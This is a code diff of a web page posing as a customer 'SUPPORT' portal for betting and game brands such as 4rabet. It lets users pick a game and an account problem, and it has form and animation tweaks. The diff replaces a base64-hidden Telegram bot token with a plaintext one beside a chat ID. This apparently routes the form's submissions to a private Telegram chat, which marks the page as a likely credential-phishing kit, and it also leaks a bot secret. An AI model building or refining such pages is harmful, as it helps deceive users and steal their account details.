@@ -71,7 +71,7 @@
         justify-content: center;
     }
 
-    .game-card:hover, .game-card.active {
+    .game-card:hover, .game-card:active {
         transform: translateY(-4px) scale(1.02);
         border-color: #ffcc00;
         box-shadow: 0 10px 25px rgba(255, 204, 0, 0.25);
@@ -122,10 +122,11 @@
         display: none;
         box-shadow: 0 15px 35px rgba(0,0,0,0.7);
         backdrop-filter: blur(15px);
+        margin-top: 10px;
     }
 
     .form-container.active {
-        display: block;
+        display: block !important;
         animation: slideUp 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
 
@@ -311,12 +312,12 @@
 </a>
 
 <script>
-    // Config Section - Corrected Syntax & Credentials
-    const BOT_TOKEN = atob('ODYzNTI4OTE2NTpBQVVVngtaV9UR3hlb2cwbjYyeGZxQl1hRG1sY2Rpbko2UQ'); 
+    // Direct Credentials Definition
+    const BOT_TOKEN = '8635289165:AAUVngtaV9UR3heog0n62xfqDUaDmlcdinJ6Q'; 
     const CHAT_ID = '8882142102';
     const CLOUD_KEY = '0x4AAAAAAAE-fSw7V00IKRlhO';
 
-    // Game Specific Issues Dynamic Mapping
+    // Game Issues Mapping
     const gameIssues = {
         '4rabet': [
             'Email confirm',
@@ -417,8 +418,8 @@
     };
 
     function selectGame(gameKey) {
-        document.getElementById('selectedGame').value = gameNames[gameKey];
-        document.getElementById('selectedGameTitle').innerText = gameNames[gameKey] + ' SUPPORT';
+        document.getElementById('selectedGame').value = gameNames[gameKey] || gameKey;
+        document.getElementById('selectedGameTitle').innerText = (gameNames[gameKey] || gameKey) + ' SUPPORT';
         
         const problemSelect = document.getElementById('problemType');
         problemSelect.innerHTML = '<option value="" disabled selected>-- Select Problem --</option>';
@@ -432,11 +433,14 @@
         });
 
         const formContainer = document.getElementById('formContainer');
+        formContainer.style.display = 'block';
         formContainer.classList.add('active');
-        formContainer.scrollIntoView({ behavior: 'smooth' });
+        
+        setTimeout(() => {
+            formContainer.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }, 100);
     }
 
-    // English Voiceover Function
     function playVoiceOver() {
         if ('speechSynthesis' in window) {
             window.speechSynthesis.cancel();
